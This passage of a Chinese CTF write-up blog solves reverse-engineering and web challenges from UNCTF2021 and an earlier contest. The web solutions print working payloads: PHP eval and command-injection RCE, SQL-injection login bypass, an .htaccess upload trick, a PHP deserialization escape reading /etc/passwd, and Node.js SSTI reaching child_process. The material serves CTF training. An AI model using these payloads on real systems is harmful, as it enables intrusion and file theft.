const 39 ; 0 298: store 0 6301: load 0 6304: const 42 ; 256 309: lt310: jz 366315: load 0 3318: load 0 6321: getitem322: load 0 3325: load 0 6328: const 44 ; 1 333: add334: const 42 ; 256 339: mod340: getitem341: bxor342: load 0 3345: load 0 6348: setitem349: load 0 6352: const 44 ; 1 357: add358: store 0 6361: jmp 301366: const 39 ; 0 371: store 0 7374: load 0 7377: const 42 ; 256 382: lt383: jz 431388: load 0 3391: load 0 7394: getitem395: const 44 ; 1 400: add401: const 42 ; 256 406: mod407: load 0 3410: load 0 7413: setitem414: load 0 7417: const 44 ; 1 422: add423: store 0 7426: jmp 374431: load 0 5434: const 44 ; 1 439: add440: store 0 5443: jmp 279448: const 39 ; 0 453: store 0 5456: const 39 ; 0 461: store 0 8464: load 0 5467: const 42 ; 256 472: lt473: jz 509478: load 0 8481: load 0 3484: load 0 5487: getitem488: add489: store 0 8492: load 0 5495: const 44 ; 1 500: add501: store 0 5504: jmp 464509: load 0 8512: const 51 ; 20 517: mul518: const 52 ; 5 523: add524: store 0 8527: load 0 8530: const 54 ; 30 535: mul536: const 52 ; 5 541: sub542: store 0 8545: load 0 8548: const 56 ; 40 553: mul554: const 52 ; 5 559: sub560: store 0 8563: load 0 8566: const 58 ; 50 571: mul572: const 59 ; 6645 577: add578: store 0 8581: const 23 ; &lt;function &#x27;print&#x27;&gt; 586: load 0 8589: call 1591: pop 根据bytecode还原代码，需要注意数组的存储顺序： 123456789101112131415161718192021222324252627key = [83,69,65][::-1]c = [101,108,111,117,122,101,105,98,101,108,117,105,113,117,105,113][::-1]S = []for i in range(256): S.append(i)for j in range(256): S[j] = (S[j]+key[j%3]+c[j%16])%256for k in range(3): for x in range(256): S[x] = S[x]^S[(x+1)%256] for y in range(256): S[y] = (S[y]+1)%256b = 0for k in range(256): b = b+S[k]b = b*20+5b = b*30-5b = b*40-5b = b*50+6645print(b)# 23075096395 flag：flag&#123;23075096395&#125; ​ combat_slogan 面对疫情，我们的口号是什么？flag{input} 用jd工具分析jar，在Main.class发现主代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.xaut;import java.util.Scanner;public class Main &#123; public static String stringTransformAscii(String value) &#123; StringBuffer sbu = new StringBuffer(); char[] chars = value.toCharArray(); for (int i = 0; i &lt; chars.length; i++) &#123; if (i != chars.length - 1) &#123; sbu.append(chars[i]).append(&quot;,&quot;); &#125; else &#123; sbu.append(chars[i]); &#125; &#125; return sbu.toString(); &#125; public static String ttk(String input) &#123; StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; input.length(); i++) &#123; char c = input.charAt(i); if (c &gt;= &#x27;a&#x27; &amp;&amp; c &lt;= &#x27;m&#x27;) &#123; c = (char)(c + 13); &#125; else if (c &gt;= &#x27;A&#x27; &amp;&amp; c &lt;= &#x27;M&#x27;) &#123; c = (char)(c + 13); &#125; else if (c &gt;= &#x27;n&#x27; &amp;&amp; c &lt;= &#x27;z&#x27;) &#123; c = (char)(c - 13); &#125; else if (c &gt;= &#x27;N&#x27; &amp;&amp; c &lt;= &#x27;Z&#x27;) &#123; c = (char)(c - 13); &#125; sb.append(c); &#125; return sb.toString(); &#125; public static void main(String[] args) &#123; System.out.println(&quot;Please input your keyword); Scanner scan = new Scanner(System.in); String str2 = &quot;ddd&quot;; if (scan.hasNextLine()) str2 = scan.nextLine(); scan.close(); String stringTransformAscii = stringTransformAscii(str2); String[] offerCodeString = stringTransformAscii.split(&quot;,&quot;); StringBuffer str5 = new StringBuffer(); for (String s : offerCodeString) str5.append(s); int flag = ttk(str2).compareTo(&quot;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&quot;); if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;871019511949491089510249103104116951164895101110100951164895101110100959997122121&quot;) == 0) &#123; System.out.println(&quot;Your keyword is correct!&quot;); &#125; else &#123; System.out.println(&quot;Your keyword is wrong!&quot;); &#125; &#125;&#125; flag经 ttk() 函数处理后与 Jr_j11y_s1tug_g0_raq_g0_raq_pnml 相同，逆 ttk() 替换函数： 1234567891011121314151617s = &#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;t = &#x27;&#x27;for k in s: if ord(k)-13 &gt;= ord(&#x27;a&#x27;) and ord(k)-13 &lt;= ord(&#x27;m&#x27;): t += chr(ord(k)-13) elif ord(k)-13 &gt;= ord(&#x27;A&#x27;) and ord(k)-13 &lt;= ord(&#x27;M&#x27;): t += chr(ord(k)-13) elif ord(k)+13 &gt;= ord(&#x27;n&#x27;) and ord(k)+13 &lt;= ord(&#x27;z&#x27;): t += chr(ord(k)+13) elif ord(k)+13 &gt;= ord(&#x27;N&#x27;) and ord(k)+13 &lt;= ord(&#x27;Z&#x27;): t += chr(ord(k)+13) else: t += kprint(t)# We_w11l_f1ght_t0_end_t0_end_cazy flag：flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125; ​ cute_doge 普通的柴犬，戳一戳会发生什么奇妙的事情呢？ 将exe用16进制工具查看，根据运行提示文字找到附近存在 ZmxhZ3tDaDFuYV95eWRzX2Nhenl9，base64解码得flag：flag&#123;Ch1na_yyds_cazy&#125;。 ​ hello_py 初次见面，送个python题，祝您接下来解题顺利，flag{input} uncompyle6反编译pyc文件得源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import threading, timedef encode_1(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ num num -= 1 time.sleep(1) if num &lt;= 0: breakdef encode_2(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ flag[(num + 1)] num -= 1 time.sleep(1) if num &lt; 0: breakwhile True: Happy = [ 44, 100, 3, 50, 106, 90, 5, 102, 10, 112] num = 9 f = input(&#x27;Please input your flag:&#x27;) if len(f) != 10: print(&#x27;Your input is illegal&#x27;) else: flag = list(f) j = 0 for i in flag: flag[j] = ord(i) j += 1 else: print(&quot;flag to &#x27;ord&#x27;:&quot;, flag) t1 = threading.Thread(target=encode_1, args=(1, )) t2 = threading.Thread(target=encode_2, args=(2, )) t1.start() time.sleep(0.5) t2.start() t1.join() t2.join() if flag == Happy: print(&#x27;Good job!&#x27;) else: print(&#x27;No no no!&#x27;) 用z3求解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import threading, timefrom z3 import *f = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(10)]flag = f[:]x = Solver()def encode_1(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ num num -= 1 time.sleep(1) if num &lt;= 0: breakdef encode_2(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ flag[(num + 1)] num -= 1 time.sleep(1) if num &lt; 0: breakwhile True: Happy = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112] num = 9 j = 0 t1 = threading.Thread(target=encode_1, args=(1, )) t2 = threading.Thread(target=encode_2, args=(2, )) t1.start() time.sleep(0.5) t2.start() t1.join() t2.join() for k in range(10): x.add(flag[k]==Happy[k]) if x.check() == sat: m = x.model() print(&#x27;&#x27;.join([chr(m[f[i]].as_long()) for i in range(len(f))])) break # He110_cazy flag：flag&#123;He110_cazy&#125; ​ WEBRCE_No_Para 1234567891011&lt;?phpif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; if(!preg_match(&#x27;/session|end|next|header|dir/i&#x27;,$_GET[&#x27;code&#x27;]))&#123; eval($_GET[&#x27;code&#x27;]); &#125;else&#123; die(&quot;Hacker!&quot;); &#125;&#125;else&#123; show_source(__FILE__);&#125;?&gt; 第一层正则表达式为递归匹配只含字母、数字、下划线的无参函数，如 a(b_c());，第二层要求不能包含 session|end|next|header|dir 关键字，使用 get_defined_vars() 可从请求中向 $_GET 传入所需执行的函数，由于 end 和 next 不能使用，可使用 reset 和 array_reverse 调整数组与取值，再利用 eval 命令执行。 payload：?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"UNCTF2021-公开赛","slug":"match-UNCTF2021公开赛","date":"2021-12-07T11:44:54.000Z","updated":"2021-12-07T16:08:16.383Z","comments":true,"path":"2021/12/07/match-UNCTF2021公开赛/","permalink":"https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"​ 为响应国家选拔、推荐优秀网络空间安全专业人才，培养学生的创新意识与团队合作精神，提高大学生的网络安全技术水平、创新实践与综合设计能力，推动我国高校网络空间安全专业建设与改革，全国9所高校（闽南师范大学，福州大学至诚学院，重庆大学，陆军工程大学，南京航空航天大学，金陵科技学院，西华大学，浙江师范大学，厦门理工大学）决定组成联合招新赛，秉着公平，公正，公开的原则为本高校选拔网络空间安全专业人才。 竞赛时间 2021年11月28日-2021年12月6日 竞赛平台 自研平台，平台地址：https://ctf.unctf.com/ Rank: 1 # Webfuzz_md5 1234567891011121314151617181920&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$user=$_GET[&quot;user&quot;];$pass=$_POST[&quot;pass&quot;];$pass2=md5($pass);$pass3=substr($pass2, 0, 5);$a=preg_replace(&quot;/unctf/i&quot;,&quot;&quot;,$user);if($a===&quot;unctf&quot;)&#123; if($pass3===&quot;66666&quot;)&#123; echo $flag; &#125; else&#123; echo &quot;welcome to unctf~&quot;; &#125;&#125;else&#123; echo &quot;welcome to unctf~~&quot;;&#125; user 参数值双写绕过，pass 参数值爆破符合前5位是66666的MD5： 12345678from hashlib import md5for i in range(100000000): x = md5(str(i).encode()).hexdigest() if x.startswith(&#x27;66666&#x27;): print(i) break# 1004649 Payload：http://xxx/?user=ununctfctf，POST传参 pass=1004649。 flag：UNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125; ​ can_you_hacked_me 带黑阔，你能把我骇咯？ www.zip 得到源码。 index.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Can You Hacked me?&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;&lt;form method=&quot;get&quot;&gt; Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt; Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;pre&gt;&lt;?phpinclude &quot;flag.php&quot;;error_reporting(0);function waf1($inject) &#123; preg_match(&quot;/&#x27;|union|select|&amp;|\\||and|or|\\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\\&#x27;|union|select|&amp;|\\\\||and|or|(|,/i&quot;,$inject);&#x27;);&#125;if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; waf1($username) || waf1($password); if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123; die(&#x27;Admin only allow to login at localhost&#x27;); &#125; $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;); $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;; $result = $conn-&gt;query($sql); echo $sql . &#x27;&lt;br&gt;&#x27;; if ($result-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result-&gt;fetch_assoc()) &#123; if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123; echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag; &#125; else &#123; die(&quot;You are not Admin.&quot;); &#125; &#125; &#125; else &#123; echo &quot;Result Not Found!&quot;; &#125; $conn-&gt;close();&#125;?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt; db.sql： 123456789101112CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli;CREATE TABLE IF NOT EXISTS `users` ( `id` int(10) NOT NULL, `username` varchar(20) NOT NULL, `password` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8;INSERT INTO `users` values(1,&#x27;test&#x27;, &#x27;test&#x27;),(2,&#x27;admin&#x27;,&#x27;AdminSecret&#x27;); 禁用的关键字使得难以进行常规注入，考虑让where条件恒真，username 传入 \\ 转义后单引号，使 username 的值为 &#39; and password =，password 传入异或操作，使总条件恒真，再筛选出第二条数据即可让查询结果为 admin。 Payload： http://xxx/?username=\\&amp;password=^0 limit 2 offset 1 --+ flag：UNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125; ​ phpmysql 你了解flag吗?在根目录哦 123456789101112131415161718192021222324252627282930&lt;?phpshow_source(__FILE__);echo(&quot;欢迎来到unctf2021，have fun&quot;.&quot;&lt;br&gt;&quot;);$db_host=$_POST[&#x27;host&#x27;];$db_user=$_POST[&#x27;user&#x27;];$db_pwd=$_POST[&#x27;pwd&#x27;];$db_port=$_POST[&#x27;port&#x27;];if($db_host==&quot;&quot;)&#123; die(&quot;数据库地址不能为空！&quot;);&#125;if(is_numeric($db_host))&#123; echo(&quot;fakeflag is /flag&quot;.&quot;&lt;br&gt;&quot;); if(preg_match(&quot;/;|\\||&amp;/is&quot;,$db_user) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_pwd) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_port))&#123; die(&quot;嘉然今天吃什么&quot;); &#125; system(&quot;mysql -h $db_host -u $db_user -p $db_pwd -P $db_port --enable-local-infile&quot;);&#125;else&#123; echo(&quot;Maybe you can do someting else&quot;.&quot;&lt;br&gt;&quot;); if(!isset($db_user) || !isset($db_pwd))&#123; eval(&quot;echo new Exception(\\&quot;&lt;script&gt;alert(&#x27;关注嘉然，顿顿解馋！！！&#x27;);&lt;/script&gt;\\&quot;);&quot;); &#125; else&#123; $db_user = str_ireplace(&quot;SplFileObject&quot;, &quot;UNCTF2021&quot;, $db_user); eval(&quot;echo new $db_user($db_pwd);&quot;); &#125;&#125; 利用最后 eval(&quot;echo new $db_user($db_pwd);&quot;); 的拼接特性，用类 DirectoryIterator 列目录后，再RCE。 Payload： POST传参 host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);// ​ babywrite 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$sandbox = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (!is_dir($sandbox)) &#123; mkdir($sandbox);&#125;if (isset($_GET[&#x27;filename&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;])) &#123; $filename = $_GET[&#x27;filename&#x27;]; $content = $_GET[&#x27;content&#x27;]; if (preg_match_all(&quot;/ph|\\.\\.|\\//i&quot;, $filename) || strlen($filename) &gt; 10) &#123; die(&quot;No way!&quot;); &#125; if (preg_match_all(&quot;/&lt;\\?|ph/&quot;, $content)) &#123; die(&quot;No way!&quot;); &#125; $filename = $sandbox . &quot;/&quot; . $filename; @file_put_contents($filename, $content); echo $filename;&#125; 传入文件名和内容写文件，禁用的关键字禁掉了伪协议、目录穿越、常规PHP头和写PHP文件。 由于sandbox内无现成PHP文件，考虑写 .htaccess 文件将普通文件以PHP文件解析。 文件内无法写入PHP代码，可以先写入base64编码字符串后，再利用 .htaccess 文件伪协议解析即可， .htaccess 文件中的用到的 php 关键字用 \\ 换行绕过。 .htaccess 文件内容： 12345AddType application/x-httpd-p\\hp .jpgp\\hp_value auto_append_file &quot;p\\hp://filter/convert.base64-decode/resource=1.jpg&quot; Payload： http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\\%0ahp%20.jpg%0ap\\%0ahp_value%20auto_append_file%20&quot;p\\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot; http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D 最后访问 1.jpg 得到flag。 ​ easy_serialize 12345678910111213141516171819202122232425262728293031&lt;?phpinclude &quot;function.php&quot;;$action = @$_POST[&#x27;action&#x27;];$name = $_POST[&#x27;name&#x27;];$pass = $_POST[&#x27;pass&#x27;];$email = $_POST[&#x27;email&#x27;];function filter($file)&#123; $filter_arr = array(&#x27;flag&#x27;,&#x27;php&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$file);&#125;$a= $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];$u = new UNCTF($pass,$email,$name);$s = serialize($u);switch($action)&#123; case 1: highlight_file(&#x27;function.php&#x27;); break; default: highlight_file(&#x27;index.php&#x27;);&#125;if(md5($a) == md5($b) &amp;&amp; $a !=$b)&#123; unserialize(filter($s));&#125; POST传入 action=1，得到 function.php 源码： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass me7eorite&#123; //test public $safe; public $class; public function __construct() &#123; $this-&gt;safe = &quot;/etc/passwd&quot;; $this-&gt;class=new UNCTF(&#x27;me7eorite&#x27;,&#x27;me7eorite@qq.com&#x27;,&#x27;me7eorite&#x27;); &#125; public function __toString() &#123; $this-&gt;class-&gt;getShell(); return &#x27;&#x27;; &#125; public function getShell()&#123; readfile($this-&gt;safe); &#125;&#125;class UNCTF&#123; public $pass; public $email; public $name; public function __construct($pass,$email,$name) &#123; $this-&gt;pass = $pass; $this-&gt;name = $name; $this-&gt;email = $email; &#125; public function getShell()&#123; echo &#x27;flag&#123;this_is_fake&#125;&#x27;; &#125; public function __destruct() &#123; echo $this-&gt;name . &#x27;Welcome to UNCTF 2021!&#x27;; &#125;&#125; 第一层，PHP弱比较特性，数组绕过，传入 ?a[]=1&amp;b[]=2； 第二层，PHP序列化+反序列化，filter() 删除三种关键字，明显的减字符型反序列化逃逸。 本地测试，先正常POST传值 name=z&amp;pass=x&amp;email=y，得到序列化字符串： O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;。 观察利用链：类UNCTF 的 __destruct() 中，控制 $this-&gt;name 可以触发类 me7eorite 的 __toString()，控制 $this-&gt;class 为新的 me7eorite 对象，避免调用类 UNCTF 的 getShell()，而调用类 me7eorite 的 getShell()，再控制 $this-&gt;safe 可任意读。 1234567891011121314&lt;?php...$y = new me7eorite;$x = new me7eorite;$x-&gt;safe = &#x27;/etc/passwd&#x27;;$x-&gt;class = $y;$name = $x;$pass = &#x27;x&#x27;;$email = &#x27;y&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:1:&quot;y&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125; 由于能POST传入的只有序列化部分的类 UNCTF 参数，可以通过给 name 传入恶意序列化字符串，serialize() 后截断正常的序列化字符串；给email 传入过滤关键字，filter() 之后使原有长度值与需去除的正常字符串长度相等，保留恶意序列化字符串，最后经 unserialize() 控制反序列化过程完成利用链。 尝试传值： 12345678910&lt;?php...$name = &#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;;$pass = &#x27;x&#x27;;$email = &#x27;phpphp&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断 计算需去除的正常字符串 &quot;;s:4:&quot;name&quot;;s:245:&quot;z 长度为21，则使得原有长度值与需去除的正常字符串长度相等，则需要 21/len(&#39;php&#39;)=21/3=7 个 php ，再将 /etc/passwd 换成 /flag： 12345678910&lt;?php...$name = &#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;;$pass = &#x27;x&#x27;;$email = &#x27;phpphpphpphpphpphpphp&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断 注意 flag 也被过滤，双写绕过即可。 Payload： http://xxx?a[]=1&amp;b[]=2，POST传参 name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp flag：UNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125; ​ nodejs_ssti一个输入框和提交按钮，尝试SSTI输入 &#123;&#123;2*3&#125;&#125; ，发现利用点在title值。 尝试 &#123;&#123;print(xx)&#125;&#125; 出现报错： 1234567891011TypeError: getValue(...) is not a function at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63) at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42) at /app/node_modules/sodajs/dist/soda.js:188:44 at String.replace (&lt;anonymous&gt;) at compile (/app/node_modules/sodajs/dist/soda.js:187:53) at /app/node_modules/sodajs/dist/soda.js:257:21 at Array.map (&lt;anonymous&gt;) at compile (/app/node_modules/sodajs/dist/soda.js:256:55) at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13) at /app/node_modules/sodajs/dist/soda.js:130:23 说明代码使用的是soda.js，实际是node.js注入，利用node.js特性使用 child_process 调用 execSync() 方法RCE。 Payload： http://xxx/who POST传参 name=&#123;&#123;\" \".toString.constructor(\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()\")()&#125;&#125;&amp;brand=web flag：UNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125; ​ encrypt_login 听说你很擅长撞库？ 随便输入用户名密码，返回提示密码为纯数字： I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :) 查看源码发现前端加密js文件 encrypto.js，代码已混淆，根据 jsjiami.com.v6 字样，使用 JSDec 在线解混淆有： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* *Progcessed By JSDec in 0.01s *JSDec - JSDec.js.org */$(&#x27;#submit&#x27;)[&#x27;click&#x27;](function() &#123; var _0x326c0f = &#123; &#x27;DTeqY&#x27;: function(_0x1553aa, _0x4bb167) &#123; return _0x1553aa == _0x4bb167; &#125;, &#x27;IeKGb&#x27;: function(_0x2ec083, _0x47b18b, _0x120b6a) &#123; return _0x2ec083(_0x47b18b, _0x120b6a); &#125;, &#x27;foePj&#x27;: &#x27;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\\nKJVXPMuQVgrw/SxkBQIDAQAB\\n-----END PUBLIC KEY-----&#x27;, &#x27;iaWKq&#x27;: function(_0x1c6939, _0x219dc9) &#123; return _0x1c6939 + _0x219dc9; &#125;, &#x27;PUpKG&#x27;: function(_0x213ed6, _0xe318d3) &#123; return _0x213ed6 + _0xe318d3; &#125;, &#x27;JNTjF&#x27;: &#x27;#username&#x27;, &#x27;OSnwF&#x27;: function(_0xd115dc, _0x2bfff6) &#123; return _0xd115dc(_0x2bfff6); &#125;, &#x27;bZMhU&#x27;: &#x27;post&#x27;, &#x27;otSyR&#x27;: function(_0x486713, _0x17d2bc) &#123; return _0x486713 + _0x17d2bc; &#125; &#125;; var _0x5182d1 = new JSEncrypt(); let _0x20b0a1 = _0x326c0f[&#x27;foePj&#x27;]; _0x5182d1[&#x27;setPublicKey&#x27;](_0x20b0a1); var _0x4833f6 = _0x5182d1[&#x27;encrypt&#x27;](_0x326c0f[&#x27;iaWKq&#x27;](_0x326c0f[&#x27;PUpKG&#x27;]($(_0x326c0f[&#x27;JNTjF&#x27;])[&#x27;val&#x27;](), &#x27;|-|&#x27;), _0x326c0f[&#x27;OSnwF&#x27;]($, &#x27;#password&#x27;)[&#x27;val&#x27;]())); $[&#x27;ajax&#x27;](&#123; &#x27;url&#x27;: &#x27;login.php&#x27;, &#x27;type&#x27;: _0x326c0f[&#x27;bZMhU&#x27;], 